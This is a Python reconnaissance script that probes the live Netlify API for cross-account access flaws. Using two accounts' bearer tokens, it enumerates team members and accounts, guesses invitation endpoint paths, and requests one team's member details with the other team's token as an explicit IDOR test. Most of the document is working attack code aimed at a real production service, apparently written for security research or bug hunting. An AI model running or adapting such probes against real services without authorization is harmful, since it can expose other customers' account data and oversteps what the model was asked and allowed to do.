# -*- coding: utf-8 -*-
"""NL1: collaborator model recon - team members structure, invitations endpoints, roles
Attack hypothesis: cross-account invitation/role boundary (A invite B; B's power as member/guest;
invitation state machine; member IDOR)"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'F:\scan\netlify_report')
from _net_creds import TOKEN_A, TOKEN_B, TEAM_A, TEAM_B

ctx = ssl.create_default_context()


def req(method, path, body=None, token=TOKEN_A, timeout=25):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json'}
    if token:
        h['Authorization'] = 'Bearer ' + token
    b = json.dumps(body).encode() if isinstance(body, (dict, list)) else body
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, txt


def show(tag, st, b, n=400):
    print("[%s] -> %d %s" % (tag, st, b[:n].replace("\n", " ")), flush=True)


def main():
    print("== NL1 ==", flush=True)
    # 1. current member structure both teams
    st, b = req("GET", "/api/v1/%s/members" % TEAM_A)
    show("A members", st, b, 1500)
    st, b = req("GET", "/api/v1/%s/members" % TEAM_B, token=TOKEN_B)
    show("B members", st, b, 1500)
    # 2. account objects (role fields)
    st, b = req("GET", "/api/v1/accounts")
    show("A accounts", st, b, 1200)
    st, b = req("GET", "/api/v1/accounts", token=TOKEN_B)
    show("B accounts", st, b, 1200)
    # 3. invitation endpoints existence
    for p in ("/api/v1/%s/invitations" % TEAM_A,
              "/api/v1/invitations",
              "/api/v1/%s/invites" % TEAM_A,
              "/api/v1/%s/members/invitations" % TEAM_A,
              "/api/v1/user/invitations",
              "/api/v1/accounts/%s/invitations" % TEAM_A):
        st, b = req("GET", p)
        show("GET " + p, st, b, 150)
        time.sleep(0.2)
    # 4. member detail (own + cross)
    st, b = req("GET", "/api/v1/%s/members" % TEAM_A)
    try:
        members = json.loads(b)
        if isinstance(members, list) and members:
            mid = members[0].get("id") or members[0].get("member_id") or members[0].get("uid")
            print("first member id:", mid, "keys:", list(members[0].keys()))
            st, b = req("GET", "/api/v1/%s/members/%s" % (TEAM_A, mid), token=TOKEN_B)
            show("B -> A member detail (IDOR)", st, b, 300)
    except Exception as ex:
        print("parse err", ex)


if __name__ == "__main__":
    main()
